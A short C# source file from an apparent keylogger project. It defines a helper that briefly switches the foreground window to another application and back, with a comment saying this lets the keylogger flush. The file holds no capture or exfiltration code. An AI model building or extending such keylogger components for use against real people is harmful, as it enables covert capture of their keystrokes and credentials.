using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
namespace Keylogger_Core_1._0
{
    public static class FocusHandler
    {
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        public static void ForceFocusChange()
        {
            IntPtr original = Process.GetCurrentProcess().MainWindowHandle;
            IntPtr switched = IntPtr.Zero;

            foreach (Process p in Process.GetProcesses())
            {
                if (!string.IsNullOrEmpty(p.MainWindowTitle) &&
                    p.Id != Process.GetCurrentProcess().Id &&
                    p.MainWindowHandle != IntPtr.Zero)
                {
                    switched = p.MainWindowHandle;
                    SetForegroundWindow(switched); // Step 1: switch to another app
                    Thread.Sleep(1000); // Wait 1 second to let keylogger flush
                    break;
                }
            }

            if (original != IntPtr.Zero)
            {
                SetForegroundWindow(original); // Step 2: return to your app
                Thread.Sleep(300); // Wait a bit to resume
            }
        }
    }
}
